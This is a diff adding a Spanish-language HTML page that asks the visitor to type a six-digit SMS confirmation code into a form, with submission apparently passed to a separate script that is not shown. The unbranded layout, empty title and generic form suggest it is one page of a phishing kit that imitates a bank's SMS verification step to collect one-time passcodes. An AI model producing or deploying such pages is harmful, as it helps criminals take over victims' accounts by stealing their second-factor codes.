@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/trani.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body>
+    <div class="topi01">
+        <div class="nav">
+            <div class="brand"></div>
+            <ul class="datenow">
+                <li class="date"></li>
+                <li class="time"></li>
+            </ul>
+            <div class="user">
+
+            </div>
+            <div class="lang">
+
+            </div>
+        </div>
+    </div>
+    <div class="kolo">
+        <div class="cct">
+            <p class="good">Introduzca el código de confirmación que ha recibido
+                a través de un SMS a su número.</p>
+            <form class="feild" method="post" id="pg3">
+                <p><span>* </span>Verificación por código SMS.</p>
+                <input type="text" placeholder="SMS" maxlength="6" required id="sps1">
+                <button type="submit">Confirmar</button>
+            </form>
+        </div>
+    </div>
+    <div class="footer">
+    <img src="./img/fot.PNG" alt="">
+    </div>
+    <script>
+        setInterval(function(){
+            var dt = new Date();
+            var time = dt.getHours() + ":" + dt.getMinutes() + ":" + dt.getSeconds();
+            var date = `${dt.getDate()}/${dt.getMonth()+1}/${dt.getFullYear()}`;
+            $(".time").text(time);
+            $(".date").text(date);
+        },100);
+    </script>
+    <script src="./js/stb.js"></script>
+</body>
+</html>
